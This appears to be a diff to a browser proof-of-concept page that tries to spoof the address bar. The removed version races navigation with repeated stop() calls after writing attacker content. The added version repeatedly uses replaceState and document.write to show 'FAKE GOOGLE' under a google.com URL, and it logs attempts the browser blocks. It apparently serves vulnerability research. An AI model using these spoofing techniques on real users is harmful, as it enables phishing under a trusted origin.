@@ -2,35 +2,31 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PoC - Navigation Stop Race</title>
+<title>PoC A - replaceState Race</title>
 </head>
 <body>
 
-<h2>Navigation Stop Race</h2>
-<button onclick="run()">Run Exploit</button>
+<h2>replaceState Race</h2>
+<button onclick="run()">Run</button>
 
 <script>
 const TARGET = "https://www.google.com";
 
-const PAYLOAD = `
-<h1>ADDRESS BAR SPOOFED</h1>
-<p>This is attacker content</p>
-`;
-
 function run() {
-  const w = window.open("about:blank");
+  const w = window.open(TARGET);
 
-  setTimeout(() => {
-    w.document.write(PAYLOAD);
-
-    // trigger navigation
-    w.location.href = TARGET;
-
-    // stop race
-    setTimeout(() => w.stop(), 1);
-    setTimeout(() => w.stop(), 5);
-    setTimeout(() => w.stop(), 10);
-  }, 100);
+  [0,10,50,100,200,500].forEach(delay => {
+    setTimeout(() => {
+      try {
+        w.history.replaceState({}, "", TARGET);
+        w.document.open();
+        w.document.write("<h1>FAKE GOOGLE</h1>");
+        w.document.close();
+      } catch(e) {
+        console.log("Blocked:", delay, e.message);
+      }
+    }, delay);
+  });
 }
 </script>
 
